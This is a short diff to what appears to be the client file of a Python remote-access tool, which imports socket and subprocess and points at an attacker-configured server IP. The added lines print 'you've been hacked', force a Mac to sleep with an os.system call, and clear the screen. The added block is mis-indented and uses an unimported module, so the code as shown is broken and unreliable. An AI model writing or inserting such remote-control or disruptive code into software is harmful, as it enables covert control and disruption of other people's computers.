@@ -6,6 +6,14 @@
 # coded by: oseid Aldary
 ##############################
 #Client_FILE
+
+import os
+        print("!!you've been hacked!!")
+        time.sleep(2)
+        os.system('pmset sleepnow')
+        print('\n'*50)
+        
+        
 import struct,socket,subprocess,os,platform,webbrowser as browser
 # server_config
 IP = "localhost" # Your server IP, default: localhost
